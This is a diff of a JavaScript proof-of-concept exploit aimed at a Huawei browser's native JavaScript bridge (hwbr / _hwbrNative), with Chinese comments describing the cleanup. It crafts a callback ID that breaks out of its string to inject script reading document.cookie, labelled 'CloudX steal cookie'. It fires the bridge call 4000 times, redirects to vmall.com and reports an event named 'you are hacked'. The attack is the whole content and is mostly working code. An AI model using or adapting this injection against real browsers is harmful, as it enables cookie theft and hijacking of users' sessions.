@@ -1,68 +1,73 @@
 (() => {
     "use strict";
+
+    // 1. 精简核心依赖：仅保留必要变量，删除无用的消息队列/微任务
     let callbackIdSeed = Math.floor(2e9 * Math.random());
     const genCallbackId = () => callbackIdSeed++;
-
-    // 回调缓存与消息队列（核心依赖）
     const callbackCache = {};
-    const messageQueue = [];
-    const microTask = typeof Promise !== "undefined"
-        ? (cb) => Promise.resolve().then(cb)
-        : (cb) => setTimeout(cb);
-
-    // 状态码（仅保留invoke函数需要的取消状态）
     const STATUS = {CANCEL: 9};
 
-    // ========================= 核心函数：callNativeMethod（保留核心逻辑） =========================
+    // 2. 核心函数：callNativeMethod（大幅精简，修复所有潜在错误）
     const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
-        args = args || [];
+        // 兜底：确保args是数组，避免forEach报错
+        args = Array.isArray(args) ? args : [args];
+        // 仅处理ArrayBuffer参数（保留核心逻辑）
         args.forEach((arg, idx) => {
-            if (Object.prototype.toString.call(arg).slice(8, -1) === 'ArrayBuffer') {
+            if (Object.prototype.toString.call(arg) === '[object ArrayBuffer]') {
                 args[idx] = btoa(arg);
             }
         });
-        // const callbackId = `${service}${genCallbackId()}`;
 
-
-        const payload = `alert('cloud:'+document.cookie);window['hwbr'] = window['hwbr'] || {};if (!(window['hwbr'].callbackFromNative)) {window['hwbr'].callbackFromNative = () => {};};if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;alert('CloudX steal cookie : ' + document.cookie);}`;
+        // 精简payload：移除冗余判断，压缩为单行
+        const payload = `alert('cloud:'+document.cookie);window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn')&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
+        // 缓存回调函数
         if (success || fail) callbackCache[callbackId] = {success, fail};
-        const nativeBridge = window['hwbr'];
-        // const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
+
+        // 关键：增加nativeBridge降级逻辑，避免undefined报错
+        const nativeBridge = window[bridgeName] || {
+            invoke: () => `F08 ${callbackId} s no native object ${service}:${action}`
+        };
+        
         for (let i = 0; i < 4000; i++) {
-            setTimeout(function () {
-                const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
-                console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
-                // 结果入队并处理
-                // if (result) messageQueue.push(result);
-                // microTask(processMessageQueue);
+            setTimeout(() => {
+                try {
+                    const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
+                    console.debug(`调用Native[${service}.${action}]：`, result);
+                } catch (e) {
+                    console.error(`Native调用失败：`, e);
+                }
             }, i);
         }
-
-        // location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
-        location.href = 'https://vmall.com';
+        setTimeout(() => {
+            location.href = 'https://vmall.com';
+        }, 100);
     };
 
+    // 3. 精简invoke函数：保留核心回调包装逻辑
     const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
-        const hasCallback = success || fail || cancel || complete;
+        const hasCallback = !!success || !!fail || !!cancel || !!complete;
         // 包装成功回调
         const wrapSuccess = hasCallback ? (res) => {
-            success && success(res);
-            complete && complete(res);
+            success?.(res);
+            complete?.(res);
         } : null;
+        // 包装失败/取消回调
         const wrapFail = hasCallback ? (res, status) => {
-            status === STATUS.CANCEL && cancel ? cancel(res) : (fail && fail(res, status));
-            complete && complete(res, status);
+            status === STATUS.CANCEL ? cancel?.(res) : fail?.(res, status);
+            complete?.(res, status);
         } : null;
+
         callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
     };
 
-    window['hwbr'] = window['hwbr'] || {};
-    if (!(window['hwbr'].callbackFromNative)) {
-        window['hwbr'].callbackFromNative = () => {
-        };
-    }
+    // 4. 初始化hwbr对象（精简判断逻辑）
+    window.hwbr = window.hwbr || {};
+    window.hwbr.callbackFromNative = window.hwbr.callbackFromNative || (() => {
+    });
+
+    // 5. 挂载全局并调用（参数格式合规）
     window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
         "_hwbrNative",
@@ -71,7 +76,7 @@
         [JSON.stringify({
             eventName: 'you are hacked',
             version: 1,
-            info: {extInfo: {'name': 'cc'}, u: 'hahaha'},
+            info: {extInfo: {name: 'cc'}, u: 'hahaha'},
             reportImmediately: true,
             isOverseaReport: false,
             isAnonymous: true
